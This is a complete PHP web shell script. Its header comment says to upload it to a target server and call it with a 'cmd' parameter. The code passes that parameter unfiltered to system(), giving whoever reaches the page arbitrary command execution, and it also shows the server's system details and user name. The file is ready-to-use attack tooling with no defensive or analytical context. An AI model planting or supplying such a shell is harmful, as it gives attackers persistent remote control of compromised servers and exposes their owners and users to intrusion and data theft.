<?php
/*
 * Simple PHP Web Shell
 * Upload to target, then access: http://target.com/cmd_webshell.php?cmd=whoami
 */

echo '<style>
body{background:#0a0a0a;color:#00ff00;font-family:"Courier New",monospace;margin:20px}
input{background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:8px;width:400px;font-family:monospace}
input:focus{outline:none;border-color:#00ff00}
pre{background:#1a1a1a;padding:10px;border-left:3px solid #00ff00}
h2{color:#00ff00;border-bottom:1px solid #333}
</style>';

echo '<h2>[ SHELL ] $_ </h2>';
echo '<form method="GET">
<input type="text" name="cmd" placeholder="Enter command..." autofocus>
<input type="submit" value="Execute" style="background:#00ff00;color:#000;border:none;padding:8px 15px;cursor:pointer">
</form>';

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo '<pre>';
    system($cmd . ' 2>&1');
    echo '</pre>';
    echo '<small>[$] ' . $cmd . '</small>';
}

echo '<hr><small>Server: ' . php_uname() . ' | User: ' . get_current_user() . '</small>';
?>
